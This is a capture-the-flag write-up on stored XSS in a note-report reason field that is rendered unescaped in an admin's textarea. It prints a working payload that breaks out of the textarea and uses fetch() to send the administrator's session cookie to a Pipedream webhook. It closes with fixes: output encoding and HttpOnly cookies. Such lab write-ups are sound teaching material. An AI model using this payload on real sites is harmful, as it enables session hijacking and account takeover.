---
title: "Intro to Web - Part 3"
date: 2025-06-22
description: Stored Cross-Site Scripting (XSS) in note report reasons allows stealing administrator session cookies via webhook exfiltration.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Intro to Web - Part 3

**Goal:** Exploit an XSS vulnerability in the note reporting system to steal the administrator's session cookie.

**Flag:**
- Administrator session cookie captured via webhook.

---

## Vulnerability

When reporting a note, the user provides a report reason that is displayed to administrators inside a `<textarea>` tag without HTML entity encoding:

```html
<textarea class="form-control">{{ report.reason }}</textarea>
```

An attacker can close the `<textarea>` element with `</textarea>` and inject an arbitrary `<script>` tag. When an admin reviews the report, the JavaScript executes within their browser context with full access to their cookies (`document.cookie`).

## Attack Path

### 1. Set Up Exfiltration Webhook

Create a public webhook endpoint on Pipedream / Webhook.site (`https://eow2tw6jg5qya6c.m.pipedream.net`).

### 2. Submit XSS Payload in Report Reason

Submit a report on any note with the following payload:

```html
</textarea><script>
fetch('https://eow2tw6jg5qya6c.m.pipedream.net', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({cookie: document.cookie})
});
</script><textarea>
```

### 3. Capture Administrator Cookie

When the automated administrator bot inspects the report queue, the script executes and sends the admin's session cookie to our webhook logger.

---

## Notes

- Always sanitize and encode user input when rendering it inside HTML tags, textareas, or script blocks.
- Set the `HttpOnly` flag on sensitive session cookies to prevent client-side JavaScript access via `document.cookie`.
